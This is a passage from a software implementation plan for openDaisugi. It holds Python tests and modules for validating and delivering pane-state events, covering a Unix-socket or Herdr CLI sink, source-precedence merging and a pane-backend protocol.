    from opendaisugi.session_tree import SessionTree

    hook_report_argv(["--root", str(tmp_path / "gate"), "--pane", "w1:p2"], _row())
    t = SessionTree.open(tmp_path / "sessions", "s1")
    states = [e for e in t.entries() if e.type == "state"]
    assert states[-1].data["pane"] == "w1:p2"


def test_hook_report_exits_one_on_malformed_json(tmp_path):
    out = hook_report_argv(["--root", str(tmp_path / "gate")], b"not json")
    assert out.exit_code == 1 and "not valid JSON" in out.stderr


def test_hook_report_exits_one_on_a_rule_violation(tmp_path):
    out = hook_report_argv(["--root", str(tmp_path / "gate")], _row(state="napping"))
    assert out.exit_code == 1 and "unknown state" in out.stderr


def test_hook_report_never_raises_on_a_reporting_failure(tmp_path, monkeypatch):
    def _boom(*_a, **_k):
        raise OSError("boom")

    monkeypatch.setattr("opendaisugi._state_report.report_state", _boom)
    out = hook_report_argv(["--root", str(tmp_path / "gate")], _row())
    assert out.exit_code == 0  # the event still parsed and validated; delivery is best-effort
```

- [ ] **Step 3: Run the tests to confirm they fail**

Run: `cd /mnt/tera/working/programming/openDaisugi && uv run --no-sync pytest tests/floor/test_report.py tests/test_state_report.py -q`
Expected: `ModuleNotFoundError: No module named 'opendaisugi._state_report'` (and the `floor`
package does not exist yet either).

- [ ] **Step 4: Write the implementation**

```python
# src/opendaisugi/_state_report.py
"""Layer-internal PaneStateEvent construction, delivery, and (for one path
that cannot import opendaisugi.floor) validation.

Stdlib only. No import from opendaisugi.floor, opendaisugi.voice, or
opendaisugi.coppice — layer purity (spec-01, master spec §4). gate.py and
hook.py build and deliver PaneStateEvents through this module without ever
reaching into the package that actually OWNS the PaneStateEvent contract
(opendaisugi.floor.events) — that package re-exports report_state from here
instead (opendaisugi/floor/report.py), the one direction layer purity
allows.

Herdr's pane-id environment variable (discovery, spec-01 plan task 1): on
this box, `command -v herdr` found no Herdr installation (Task 0 Step 2
records `herdr` as absent), so the name below is UNVERIFIED against a real
Herdr process. HERDR_PANE_ID is used as the primary candidate (matching
Herdr's own naming convention for its other *_ID variables), with
HERDR_PANE kept as a documented fallback for older Herdr releases. The
Herdr CLI invocation this module shells out to
(`pane report-agent <pane> --source daisugi --agent <harness> --state
<state>`) is EQUALLY unverified — the verb, every flag name, and the env
var are all guesses from Herdr's public docs, not a real run. Re-run the
whole probe (`herdr pane create`, then inspect the child process's
environment AND try the report-agent invocation itself) on a box with
Herdr installed and update this paragraph before spec-06 (the
phone/coppice cutover) ships.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import time
from collections.abc import Mapping
from dataclasses import dataclass
from pathlib import Path
from typing import Any

STATES = ("idle", "working", "blocked", "done", "unknown")
SOURCES = ("operator", "gate", "headless", "process", "manifest")

HERDR_PANE_ENV_CANDIDATES: tuple[str, ...] = ("HERDR_PANE_ID", "HERDR_PANE")

_DETAIL_MAX = 200
_DEFAULT_ROOT = Path.home() / ".opendaisugi" / "gate"  # mirrors opendaisugi.gate.DEFAULT_GATE_ROOT
_HERDR_STATE_MAP = {"working": "working", "blocked": "blocked", "idle": "idle", "done": "idle"}


def _clip(s: str, n: int = _DETAIL_MAX) -> str:
    return s[:n]


def build_event(
    *,
    session_id: str,
    harness: str,
    state: str,
    source: str = "gate",
    harness_session_id: str | None = None,
    pane: str | None = None,
    ask: dict[str, Any] | None = None,
    detail: str = "",
    ts: float | None = None,
    v: int = 1,
) -> str:
    """Serialize one PaneStateEvent-shaped JSON line (master spec §3.1).

    Trusted-caller helper: gate.py and hook.py are the only callers, and
    both pass known-good literals for state/source, so this never validates
    them — that is opendaisugi.floor.events.PaneStateEvent's job for
    untrusted input. ``detail`` IS clamped here: an operator-authored
    ``reason``/``clause`` string can be arbitrarily long; the wire format
    cannot.
    """
    row: dict[str, Any] = {
        "v": v,
        "ts": time.time() if ts is None else ts,
        "session_id": session_id,
        "harness_session_id": harness_session_id,
        "harness": harness,
        "pane": pane,
        "state": state,
        "source": source,
        "detail": _clip(str(detail)),
    }
    if ask is not None:
        row["ask"] = ask
    return json.dumps(row)


def report_state(
    ev_json: str, *, env: Mapping[str, str] = os.environ, budget_s: float = 0.2
) -> str:
    """Deliver one PaneStateEvent line. Returns which sink took it:
    ``'coppice' | 'herdr' | 'none'``.

    coppice wins when both COPPICE_SOCK/COPPICE_PANE and a Herdr pane env
    var are present (a Herdr pane hosting coppice is not a supported
    nesting — first match wins). Never raises; any failure is 'none'.

    ``budget_s`` is a TOTAL wall-clock budget, not a per-operation one: one
    deadline is taken up front and the remaining time is re-applied before
    each of connect/sendall/recv (and to the Herdr subprocess wait), so a
    wedged peer costs at most ~budget_s on the gate's blocking hot path,
    never 2x or 3x that. The Herdr path uses Popen + wait(timeout=) + kill()
    with stdout/stderr sent to DEVNULL rather than subprocess.run(timeout=):
    run()'s timeout path kills the child but then calls communicate() again,
    which blocks until every inherited pipe closes — a herdr that forks a
    daemon could hold the gate open past the budget regardless of the
    timeout value. Popen + an explicit kill()/wait() has no such pipe to
    wait on.
    """
    try:
        ev = json.loads(ev_json)
    except Exception:
        return "none"
    deadline = time.monotonic() + budget_s

    def _remaining() -> float:
        return max(0.001, deadline - time.monotonic())

    sock_path = env.get("COPPICE_SOCK")
    coppice_pane = env.get("COPPICE_PANE")
    if sock_path and coppice_pane:
        import socket

        try:
            with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as s:
                s.settimeout(_remaining())
                s.connect(sock_path)
                s.settimeout(_remaining())
                req = (
                    json.dumps(
                        {"id": "r", "cmd": "pane.report_state", "pane": coppice_pane, "event": ev}
                    )
                    + "\n"
                )
                s.sendall(req.encode("utf-8"))
                s.settimeout(_remaining())
                s.recv(65536)
            return "coppice"
        except Exception:
            return "none"
    herdr_pane = next((env[k] for k in HERDR_PANE_ENV_CANDIDATES if env.get(k)), None)
    if herdr_pane:
        mapped = _HERDR_STATE_MAP.get(ev.get("state"))
        if mapped is None:
            return "none"  # e.g. 'unknown' — Herdr's CLI has no such state
        herdr_bin = shutil.which("herdr", path=env.get("PATH"))
        if not herdr_bin:
            return "none"
        try:
            proc = subprocess.Popen(
                [
                    herdr_bin,
                    "pane",
                    "report-agent",
                    herdr_pane,
                    "--source",
                    "daisugi",
                    "--agent",
                    str(ev.get("harness") or ""),
                    "--state",
                    mapped,
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                env=dict(env),
            )
            try:
                proc.wait(timeout=_remaining())
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait(timeout=1.0)
                return "none"
            return "herdr"
        except Exception:
            return "none"
    return "none"


def _validate_hook_report_row(row: dict[str, Any]) -> None:
    """A narrow, independent re-implementation of the master spec §3.1
    rules, used ONLY by `hook_report_argv` below — the one path
    (`daisugi hook report`, reachable through gate.sock) that a layer
    module must serve without importing opendaisugi.floor.events, which
    owns the real contract. Deliberately duplicated, not imported.
    tests/floor/test_events.py::test_layer_validator_and_dataclass_agree
    pins the two implementations to the same accept/reject verdict on
    every rule below.
    """
    for key in ("session_id", "harness", "state", "source", "ts"):
        if key not in row:
            raise ValueError(f"event missing required field {key!r}")
    if row["state"] not in STATES:
        raise ValueError(f"unknown state {row['state']!r}")
    if row["source"] not in SOURCES:
        raise ValueError(f"unknown source {row['source']!r}")
    if row["state"] == "done" and row["source"] not in ("process", "headless"):
        raise ValueError("state 'done' may only come from source 'process' or 'headless'")
    if len(str(row.get("detail", ""))) > _DETAIL_MAX:
        raise ValueError(f"detail exceeds {_DETAIL_MAX} characters")
    ask = row.get("ask")
    if ask is not None:
        if row["state"] != "blocked":
            raise ValueError("ask is only valid when state == 'blocked'")
        for key in ("id", "tool", "summary", "deadline"):
            if key not in ask:
                raise ValueError(f"ask missing required field {key!r}")
    try:
        v = int(row.get("v", 1))
    except (TypeError, ValueError) as exc:
        raise ValueError(f"invalid schema version {row.get('v')!r}") from exc
    if v != 1:
        raise ValueError(f"unsupported event schema version {v!r}")


@dataclass(frozen=True)
class HookReportOutcome:
    stdout: str
    stderr: str
    exit_code: int


def _build_hook_report_parser():
    import argparse

    p = argparse.ArgumentParser(prog="daisugi hook report", add_help=False)
    p.add_argument("--pane", default=None)
    p.add_argument("--root", type=Path, default=_DEFAULT_ROOT)
    return p


def hook_report_argv(argv: list[str], raw: bytes) -> HookReportOutcome:
    """`daisugi hook report [--pane P] [--root R]` — validate, downgrade a
    claimed gate/operator source to headless, append to the session tree,
    and deliver.

    Exit 0 once stdin parses to a JSON object AND passes validation; exit 1
    (message on stderr) for anything malformed. Never raises out to the
    caller — this runs on a socket handler's path (gate_server.py) too.
    """
    try:
        args = _build_hook_report_parser().parse_args(argv)
    except SystemExit:
        return HookReportOutcome("", "daisugi hook report: bad arguments", 1)
    try:
        row = json.loads(raw.decode("utf-8"))
    except Exception as exc:
        return HookReportOutcome("", f"daisugi hook report: not valid JSON: {exc}", 1)
    if not isinstance(row, dict):
        return HookReportOutcome("", "daisugi hook report: event must be a JSON object", 1)
    if row.get("source") in ("gate", "operator"):
        row["source"] = "headless"
    if args.pane is not None:
        row["pane"] = args.pane
    try:
        _validate_hook_report_row(row)
    except ValueError as exc:
        return HookReportOutcome("", f"daisugi hook report: {exc}", 1)
    try:
        from opendaisugi.session_tree import SessionTree

        tree = SessionTree.open_or_create(
            args.root.parent / "sessions",
            session_id=str(row["session_id"]),
            harness=str(row["harness"]),
            cwd="",
            harness_session_id=row.get("harness_session_id"),
        )
        tree.append("state", row)
    except Exception:  # noqa: BLE001 — best-effort by contract
        pass
    try:
        report_state(json.dumps(row))
    except Exception:  # noqa: BLE001 — best-effort by contract
        pass
    return HookReportOutcome("", "", 0)
```

```python
# src/opendaisugi/floor/__init__.py
"""The floor package — a placeholder marker for this task; Task 2 fills in
the real exports (PaneStateEvent, PaneBackend, and friends)."""

from __future__ import annotations
```

```python
# src/opendaisugi/floor/report.py
"""report_state(): the one function every gate/hook/extension call site
uses to tell a listening floor (coppice or Herdr) about a state change.

Implemented in the layer (opendaisugi._state_report, stdlib only, no floor
import — spec-01's layer-purity rule) and re-exported here for floor-side
and extension callers that don't need the layer-internal validator too.
"""

from __future__ import annotations

from opendaisugi._state_report import report_state

__all__ = ["report_state"]
```

- [ ] **Step 5: Run the tests to confirm they pass**

Run: `cd /mnt/tera/working/programming/openDaisugi && uv run --no-sync pytest tests/floor/test_report.py tests/test_state_report.py -q`
Expected: all tests pass.

- [ ] **Step 6: Lint and commit**

```bash
uv run --no-sync ruff check src/opendaisugi/_state_report.py src/opendaisugi/floor/ tests/floor/test_report.py tests/test_state_report.py
git add src/opendaisugi/_state_report.py src/opendaisugi/floor/__init__.py src/opendaisugi/floor/report.py tests/floor/test_report.py tests/test_state_report.py
git commit -m "feat(floor): the gate's event builder, deliverer, and hook-report path — coppice socket, Herdr CLI, or nobody"
```

---

### Task 2: `opendaisugi.floor` contracts — `PaneStateEvent`, `Ask`, `merge()`, `PaneBackend`

**Files:**
- Modify: `src/opendaisugi/floor/__init__.py` (real exports)
- Create: `src/opendaisugi/floor/events.py`
- Create: `src/opendaisugi/floor/backend.py`
- Test: `tests/floor/test_events.py`
- Test: `tests/floor/test_backend.py`

**Interfaces:**
- Consumes: `opendaisugi._state_report.STATES`, `.SOURCES`, `._validate_hook_report_row`
  (Task 1 — read-only, for the cross-check test; `events.py` itself does NOT import them).
- Produces:
  `STATES: tuple[str, ...]`, `SOURCES: tuple[str, ...]` (independently defined here — see the
  module docstring for why);
  `Ask(id: str, tool: str, summary: str, deadline: float)` (frozen dataclass);
  `PaneStateEvent(session_id: str, harness: str, state: str, source: str, ts: float, harness_session_id: str | None = None, pane: str | None = None, ask: Ask | None = None, detail: str = "", v: int = 1)`
  with `.to_json() -> str` and classmethod `.from_json(line: str) -> PaneStateEvent` (raises
  `ValueError` on any §3.1 violation);
  `merge(current: PaneStateEvent | None, incoming: PaneStateEvent, *, now: float) -> PaneStateEvent`;
  `effective_state(current: PaneStateEvent | None, *, now: float) -> PaneStateEvent | None`
  (the read-time counterpart to `merge`'s expiry rule — see its own docstring below);
  `PaneRef(backend: str, id: str)`, `PaneInfo(ref, label, cwd, cmd, kind, state=None)`,
  `Frame(pane, seq, cols, rows, cursor, rows_changed)` (all frozen dataclasses);
  `PaneBackend` (a `typing.Protocol`, no implementation) — `spawn(self, *, cwd, cmd, env, label, kind, harness: str | None = None) -> PaneRef` (master §3.2, amended: `harness` names the
  adapter per §3.4's table, required when `kind == "headless"`; plan 03's coppice/Herdr/tmux
  backends implement it).

- [ ] **Step 1: Write the failing tests**

```python
# tests/floor/test_events.py
"""PaneStateEvent (master spec §3.1): every rule as its own test."""

from __future__ import annotations

import json

import pytest

from opendaisugi.floor.events import Ask, PaneStateEvent, effective_state, merge


def _row(**over):
    base = {
        "v": 1,
        "ts": 1000.0,
        "session_id": "s1",
        "harness": "claude-code",
        "state": "idle",
        "source": "manifest",
        "detail": "",
    }
    base.update(over)
    return base


def test_round_trip_preserves_every_field():
    ev = PaneStateEvent(
        session_id="s1",
        harness="claude-code",
        state="blocked",
        source="gate",
        ts=1000.0,
        harness_session_id="h1",
        pane="w1:p1",
        ask=Ask(id="t1", tool="Bash", summary="rm -rf build/", deadline=1090.0),
        detail="awaiting operator",
    )
    back = PaneStateEvent.from_json(ev.to_json())
    assert back == ev


def test_unknown_state_is_rejected():
    with pytest.raises(ValueError, match="unknown state"):
        PaneStateEvent.from_json(json.dumps(_row(state="napping")))


def test_unknown_source_is_rejected():
    with pytest.raises(ValueError, match="unknown source"):
        PaneStateEvent.from_json(json.dumps(_row(source="ouija")))


def test_manifest_cannot_say_done():
    with pytest.raises(ValueError, match="done"):
        PaneStateEvent.from_json(json.dumps(_row(source="manifest", state="done")))


def test_process_can_say_done():
    ev = PaneStateEvent.from_json(json.dumps(_row(source="process", state="done")))
    assert ev.state == "done"


def test_only_process_and_headless_may_say_done():
    """Master §3.1: 'done comes only from process or headless'. A gate- or
    operator-sourced done would show a live agent as finished — not just
    manifest is barred, every other source is too."""
    for bad_source in ("gate", "operator", "manifest"):
        with pytest.raises(ValueError, match="done"):
            PaneStateEvent.from_json(json.dumps(_row(source=bad_source, state="done")))
    for good_source in ("process", "headless"):
        ev = PaneStateEvent.from_json(json.dumps(_row(source=good_source, state="done")))
        assert ev.state == "done"


def test_detail_over_200_chars_is_rejected():
    with pytest.raises(ValueError, match="200"):
        PaneStateEvent.from_json(json.dumps(_row(detail="x" * 201)))


def test_ask_only_valid_when_blocked():
    row = _row(
        state="working",
        source="gate",
        ask={"id": "t1", "tool": "Bash", "summary": "ls", "deadline": 1090.0},
    )
    with pytest.raises(ValueError, match="blocked"):
        PaneStateEvent.from_json(json.dumps(row))


def test_ask_is_required_when_present_but_incomplete():
    row = _row(state="blocked", source="gate", ask={"id": "t1", "tool": "Bash"})
    with pytest.raises(ValueError, match="ask missing"):
        PaneStateEvent.from_json(json.dumps(row))


def test_missing_required_field_is_rejected():
    row = _row()
    del row["harness"]
    with pytest.raises(ValueError, match="harness"):
        PaneStateEvent.from_json(json.dumps(row))


def test_gate_blocked_holds_until_deadline():
    """A gate 'blocked' hold survives a lower-precedence event; once the
    ask's deadline passes, the hold releases and the NEXT event (gate or
    otherwise) gets through — merge() does not itself synthesize
    'working'. The gate sends that event itself the moment _maybe_ask's
    wait resolves (gate.py, task 3)."""
    current = PaneStateEvent(
        session_id="s1",
        harness="claude-code",
        state="blocked",
        source="gate",
        ts=1000.0,
        ask=Ask(id="t1", tool="Bash", summary="rm -rf build/", deadline=1010.0),
    )
    manifest_idle = PaneStateEvent(
        session_id="s1", harness="claude-code", state="idle", source="manifest", ts=1005.0
    )
    assert merge(current, manifest_idle, now=1005.0) is current
    assert merge(current, manifest_idle, now=1011.0) is manifest_idle
    gate_working = PaneStateEvent(
        session_id="s1", harness="claude-code", state="working", source="gate", ts=1005.0
    )
    assert merge(current, gate_working, now=1005.0) is gate_working


def test_source_precedence_within_two_seconds():
    current = PaneStateEvent(
        session_id="s1", harness="claude-code", state="working", source="operator", ts=1000.0
    )
    lower = PaneStateEvent(
        session_id="s1", harness="claude-code", state="idle", source="manifest", ts=1000.5
    )
    assert merge(current, lower, now=1000.5) is current


def test_source_precedence_expires_after_two_seconds():
    current = PaneStateEvent(
        session_id="s1", harness="claude-code", state="working", source="operator", ts=1000.0
    )
    lower = PaneStateEvent(
        session_id="s1", harness="claude-code", state="idle", source="manifest", ts=1002.5
    )
    assert merge(current, lower, now=1002.5) is lower


def test_no_current_event_always_takes_the_incoming_one():
    incoming = PaneStateEvent(
        session_id="s1", harness="claude-code", state="idle", source="manifest", ts=1000.0
    )
    assert merge(None, incoming, now=1000.0) is incoming


def test_expired_gate_block_reads_as_working_with_no_fresh_event():
    """merge()'s expiry only RELEASES a hold when a fresh event arrives —
    two paths never send one at all (the gate's is_disarmed early return
    emits no report; a gate-process crash between post_ask and its own
    resolving 'working' report leaves nothing to arrive). effective_state
    is the read-time counterpart: a cached blocked event past its
    deadline reads as working even with nothing fresh to merge against."""
    blocked = PaneStateEvent(
        session_id="s1",
        harness="claude-code",
        state="blocked",
        source="gate",
        ts=1000.0,
        ask=Ask(id="t1", tool="Bash", summary="rm -rf build/", deadline=1010.0),
    )
    assert effective_state(blocked, now=1005.0) is blocked
    resolved = effective_state(blocked, now=1011.0)
    assert resolved.state == "working" and resolved.ask is None
    assert resolved.detail == "ask deadline passed"
    assert effective_state(None, now=1000.0) is None
    idle = PaneStateEvent(
        session_id="s1", harness="claude-code", state="idle", source="manifest", ts=1000.0
    )
    assert effective_state(idle, now=99999.0) is idle


@pytest.mark.parametrize(
    "row,should_raise",
    [
        (_row(), False),
        (
            _row(
                state="blocked",
                source="gate",
                ask={"id": "t1", "tool": "Bash", "summary": "ls", "deadline": 1090.0},
            ),
            False,
        ),
        (_row(state="napping"), True),
        (_row(source="ouija"), True),
        (_row(source="manifest", state="done"), True),
        (_row(source="gate", state="done"), True),
        (_row(source="operator", state="done"), True),
        (_row(source="process", state="done"), False),
        (_row(source="headless", state="done"), False),
        (_row(detail="x" * 201), True),
        (
            _row(
                state="working",
                source="gate",
                ask={"id": "t1", "tool": "Bash", "summary": "ls", "deadline": 1090.0},
            ),
            True,
        ),
        (_row(v=2), True),
    ],
)
def test_layer_validator_and_dataclass_agree_on_every_rule(row, should_raise):
    """Two implementations of §3.1 exist by construction (layer purity:
    gate_server.py, a layer module, cannot import opendaisugi.floor). This
    pins them to the same accept/reject verdict so they can't silently
    drift apart."""
    from opendaisugi._state_report import _validate_hook_report_row

    def _raises(fn):
        try:
            fn()
        except ValueError:
            return True
        return False

    layer_raises = _raises(lambda: _validate_hook_report_row(dict(row)))
    dataclass_raises = _raises(lambda: PaneStateEvent.from_json(json.dumps(row)))
    assert layer_raises == dataclass_raises == should_raise


def test_state_and_source_enums_match_the_layer():
    from opendaisugi._state_report import SOURCES as LAYER_SOURCES
    from opendaisugi._state_report import STATES as LAYER_STATES
    from opendaisugi.floor.events import SOURCES, STATES

    assert set(STATES) == set(LAYER_STATES)
    assert set(SOURCES) == set(LAYER_SOURCES)
```

```python
# tests/floor/test_backend.py
"""Structural tests for the PaneBackend value types (master spec §3.2).

No implementation exists yet (spec-02/03) — this only pins the shapes
later backends and the contract suite (tests/floor/test_backend_contract.py,
spec-03) will type against.
"""

from __future__ import annotations

import pytest

from opendaisugi.floor.backend import Frame, PaneBackend, PaneInfo, PaneRef
from opendaisugi.floor.events import PaneStateEvent


def test_pane_ref_is_hashable_and_comparable_by_value():
    a = PaneRef(backend="coppice", id="w1:p1")
    b = PaneRef(backend="coppice", id="w1:p1")
    c = PaneRef(backend="herdr", id="w1:p1")
    assert a == b and hash(a) == hash(b)
    assert a != c


def test_pane_info_carries_an_optional_state():
    ref = PaneRef(backend="coppice", id="w1:p1")
    info = PaneInfo(ref=ref, label="auth fix", cwd="/repo", cmd=["claude"], kind="pty")
    assert info.state is None
    ev = PaneStateEvent(
        session_id="s1", harness="claude-code", state="idle", source="manifest", ts=1.0
    )
    info2 = PaneInfo(ref=ref, label="auth fix", cwd="/repo", cmd=["claude"], kind="pty", state=ev)
    assert info2.state is ev


def test_frame_shape():
    f = Frame(
        pane="w1:p1",
        seq=1,
        cols=120,
        rows=40,
        cursor=(0, 0),
        rows_changed={0: [["hi", "default", "default", []]]},
    )
    assert f.cols == 120 and f.rows_changed[0][0][0] == "hi"


def test_a_fake_backend_satisfies_the_protocol_structurally():
    """PaneBackend is not @runtime_checkable (it carries a non-method `name`
    attribute) — this just proves a plausible implementation can supply
    every named member without a metaclass fight, so spec-02/03/04/05 have
    something real to implement against."""

    class _Fake:
        name = "fake"

        def available(self) -> bool:
            return True

        def spawn(self, *, cwd, cmd, env, label, kind, harness=None):
            if kind == "headless" and harness is None:
                raise ValueError("headless spawn needs a harness name (master §3.2)")
            return PaneRef(backend="fake", id="1")

        def list(self):
            return []

        def send_text(self, pane, text, *, enter=True):
            return None

        def send_keys(self, pane, keys):
            return None

        def read(self, pane, *, source="visible"):
            return ""

        def resize(self, pane, cols, rows):
            return None

        def close(self, pane):
            return None

        def subscribe(self):
            return iter(())

        def report_state(self, pane, ev):
            return None

    fake: PaneBackend = _Fake()
    assert fake.available() is True
    assert fake.spawn(cwd="/", cmd=["x"], env={}, label="l", kind="pty") == PaneRef("fake", "1")


def test_headless_spawn_needs_a_harness_name():
    """master §3.2 (amended): harness names the adapter (§3.4's table) so
    coppice-server can pick the right headless adapter — required for a
    headless spawn, optional for a PTY one (which infers it later)."""

    class _Fake:
        name = "fake"

        def spawn(self, *, cwd, cmd, env, label, kind, harness=None):
            if kind == "headless" and harness is None:
                raise ValueError("headless spawn needs a harness name")
            return PaneRef(backend="fake", id="1")

    fake = _Fake()
    with pytest.raises(ValueError, match="harness"):
        fake.spawn(cwd="/", cmd=["claude", "-p"], env={}, label="l", kind="headless")
    ref = fake.spawn(
        cwd="/", cmd=["claude", "-p"], env={}, label="l", kind="headless", harness="claude-code"
    )
    assert ref == PaneRef("fake", "1")
```

- [ ] **Step 2: Run the tests to confirm they fail**

Run: `cd /mnt/tera/working/programming/openDaisugi && uv run --no-sync pytest tests/floor/test_events.py tests/floor/test_backend.py -q`
Expected: `ModuleNotFoundError: No module named 'opendaisugi.floor.events'`.

- [ ] **Step 3: Write the implementation**

```python
# src/opendaisugi/floor/events.py
"""PaneStateEvent (master spec §3.1) — one JSON object per line.

Owns the canonical §3.1 rules: state/source enums, a manifest source may
never claim 'done', the ask sub-object is only valid when
state == 'blocked', and detail is capped at 200 characters.
opendaisugi._state_report has its OWN, independently-implemented, narrower
validator for the one path that cannot import this package
(`daisugi hook report`, reachable through gate.sock — gate_server.py is a
layer module and may not import opendaisugi.floor, which owns this
contract). tests/floor/test_events.py::test_layer_validator_and_dataclass_agree
pins the two to the same verdicts; this module does not import the layer's
copy, on purpose — floor owns this contract, not the layer.
"""

from __future__ import annotations

import json
import time
from dataclasses import dataclass, replace

STATES = ("idle", "working", "blocked", "done", "unknown")
SOURCES = ("operator", "gate", "headless", "process", "manifest")  # precedence, highest first

_DETAIL_MAX = 200
_PRECEDENCE = {name: i for i, name in enumerate(reversed(SOURCES))}


@dataclass(frozen=True)
class Ask:
    id: str
    tool: str
    summary: str
    deadline: float


@dataclass(frozen=True)
class PaneStateEvent:
    session_id: str
    harness: str
    state: str
    source: str
    ts: float
    harness_session_id: str | None = None
    pane: str | None = None
    ask: Ask | None = None
    detail: str = ""
    v: int = 1

    def __post_init__(self) -> None:
        if self.state not in STATES:
            raise ValueError(f"unknown state {self.state!r}")
        if self.source not in SOURCES:
            raise ValueError(f"unknown source {self.source!r}")
        if self.state == "done" and self.source not in ("process", "headless"):
            raise ValueError("state 'done' may only come from source 'process' or 'headless'")
        if len(self.detail) > _DETAIL_MAX:
            raise ValueError(f"detail exceeds {_DETAIL_MAX} characters")
        if self.ask is not None and self.state != "blocked":
            raise ValueError("ask is only valid when state == 'blocked'")
        if self.v != 1:
            raise ValueError(f"unsupported event schema version {self.v!r}")

    def to_json(self) -> str:
        row: dict[str, object] = {
            "v": self.v,
            "ts": self.ts,
            "session_id": self.session_id,
            "harness_session_id": self.harness_session_id,
            "harness": self.harness,
            "pane": self.pane,
            "state": self.state,
            "source": self.source,
            "detail": self.detail,
        }
        if self.ask is not None:
            row["ask"] = {
                "id": self.ask.id,
                "tool": self.ask.tool,
                "summary": self.ask.summary,
                "deadline": self.ask.deadline,
            }
        return json.dumps(row)

    @classmethod
    def from_json(cls, line: str) -> "PaneStateEvent":
        try:
            row = json.loads(line)
        except json.JSONDecodeError as exc:
            raise ValueError(f"not valid JSON: {exc}") from exc
        if not isinstance(row, dict):
            raise ValueError("event must be a JSON object")
        required = ("session_id", "harness", "state", "source", "ts")
        missing = [k for k in required if k not in row]
        if missing:
            raise ValueError(f"missing required field(s): {', '.join(missing)}")
        ask_row = row.get("ask")
        ask_obj: Ask | None = None
        if ask_row is not None:
            if not isinstance(ask_row, dict):
                raise ValueError("ask must be a JSON object")
            ask_missing = [k for k in ("id", "tool", "summary", "deadline") if k not in ask_row]
            if ask_missing:
                raise ValueError(f"ask missing field(s): {', '.join(ask_missing)}")
            try:
                ask_obj = Ask(
                    id=str(ask_row["id"]),
                    tool=str(ask_row["tool"]),
                    summary=str(ask_row["summary"]),
                    deadline=float(ask_row["deadline"]),
                )
            except (TypeError, ValueError) as exc:
                raise ValueError(f"malformed ask: {exc}") from exc
        try:
            return cls(
                session_id=str(row["session_id"]),
                harness=str(row["harness"]),
                state=str(row["state"]),
                source=str(row["source"]),
                ts=float(row["ts"]),
                harness_session_id=row.get("harness_session_id"),
                pane=row.get("pane"),
                ask=ask_obj,
                detail=str(row.get("detail", "")),
                v=int(row.get("v", 1)),
            )
        except (TypeError, ValueError) as exc:
            raise ValueError(f"malformed event: {exc}") from exc


def merge(
    current: PaneStateEvent | None, incoming: PaneStateEvent, *, now: float
) -> PaneStateEvent:
    """Resolve two ALREADY-VALID events by §3.1 source precedence.

    A gate 'blocked' event holds until a gate event explicitly clears it,
    or its ask's deadline passes. Expiry only RELEASES the hold here — it
    does NOT synthesize a 'working' event. The gate always sends its own
    'working' event the moment `_maybe_ask`'s wait resolves (gate.py, task
    3), by answer or by timeout, which arrives at (or a hair after) the
    same deadline; this function just stops holding the door shut once
    that deadline has passed, so that event — or, failing that, whatever
    the next real event is — gets through instead of being silently
    discarded by precedence. A reader holding only a stale cached event,
    with no fresh `incoming` to merge against at all, calls
    :func:`effective_state` instead — the same expiry rule applied without
    a second event.
    """
    if current is None:
        return incoming
    holding = current.source == "gate" and current.state == "blocked"
    if holding:
        deadline = current.ask.deadline if current.ask else None
        expired = deadline is not None and now >= deadline
        if incoming.source == "gate":
            return incoming
        if not expired:
            return current
        # expired: the hold has lapsed; fall through to ordinary precedence
    if now - current.ts < 2.0 and _PRECEDENCE[incoming.source] < _PRECEDENCE[current.source]:
        return current
    return incoming


def effective_state(current: PaneStateEvent | None, *, now: float) -> PaneStateEvent | None:
    """Read-time counterpart to merge()'s expiry rule.

    merge() only releases a gate 'blocked' hold when a FRESH incoming
    event actually arrives. Two paths never send one at all:
    gate_and_contract's is_disarmed early return emits no report, and any
    crash of the gate process between post_ask and its own resolving
    'working' report leaves the last stored event 'blocked' forever. A
    reader that has only a cached event (no fresh one to merge against —
    a coppice-server reading the last known state, a cockpit roster view)
    calls this instead: returns ``current`` unchanged unless it is a
    ``gate`` ``blocked`` event whose ``ask.deadline`` has passed, in which
    case it returns a synthesized 'working' event (ask cleared, detail
    explains why) so a stale blocked hold never displays forever.
    """
    if current is None:
        return current
    if current.source != "gate" or current.state != "blocked":
        return current
    deadline = current.ask.deadline if current.ask else None
    if deadline is None or now < deadline:
        return current
    return replace(current, state="working", ask=None, detail="ask deadline passed")
```

```python
# src/opendaisugi/floor/backend.py
"""The PaneBackend contract (master spec §3.2) — protocol + value types.

No implementations here — coppice, Herdr, and tmux backends are spec-02/03.
This module exists so spec-02/03/04/05 can type against one contract before
any backend exists.
"""

from __future__ import annotations

from collections.abc import Iterator
from dataclasses import dataclass
from pathlib import Path
from typing import Literal, Protocol

from opendaisugi.floor.events import PaneStateEvent


@dataclass(frozen=True)
class PaneRef:
    backend: str
    id: str


@dataclass(frozen=True)
class PaneInfo:
    ref: PaneRef
    label: str
    cwd: str
    cmd: list[str]
    kind: str
    state: PaneStateEvent | None = None


@dataclass(frozen=True)
class Frame:
    pane: str
    seq: int
    cols: int
    rows: int
    cursor: tuple[int, int]
    rows_changed: dict[int, list[list]]


class PaneBackend(Protocol):
    name: str

    def available(self) -> bool: ...
    def spawn(
        self,
        *,
        cwd: Path,
        cmd: list[str],
        env: dict[str, str],
        label: str,
        kind: Literal["pty", "headless"],
        harness: str | None = None,
    ) -> PaneRef: ...
    # ``harness`` names the adapter (e.g. "claude-code", "codex", "pi",
    # "opencode", "sprig" — master §3.4's table) so coppice-server can pick
    # the right headless adapter and PaneStateEvents can carry a real
    # ``harness`` value from spawn onward. Required when
    # ``kind == "headless"``; a PTY pane infers its harness later, from
    # the manifest fallback or its own hook, so it may omit it. Not
    # enforced here — ``PaneBackend`` is a contract for implementers
    # (spec-02/03/04/05), not a runtime check.
    def list(self) -> list[PaneInfo]: ...
    def send_text(self, pane: PaneRef, text: str, *, enter: bool = True) -> None: ...
    def send_keys(self, pane: PaneRef, keys: list[str]) -> None: ...
    def read(
        self, pane: PaneRef, *, source: Literal["visible", "recent", "detection"] = "visible"
    ) -> str: ...
    def resize(self, pane: PaneRef, cols: int, rows: int) -> None: ...
    def close(self, pane: PaneRef) -> None: ...
    def subscribe(self) -> Iterator[PaneStateEvent | Frame]: ...
    def report_state(self, pane: PaneRef, ev: PaneStateEvent) -> None: ...
```

```python
# src/opendaisugi/floor/__init__.py
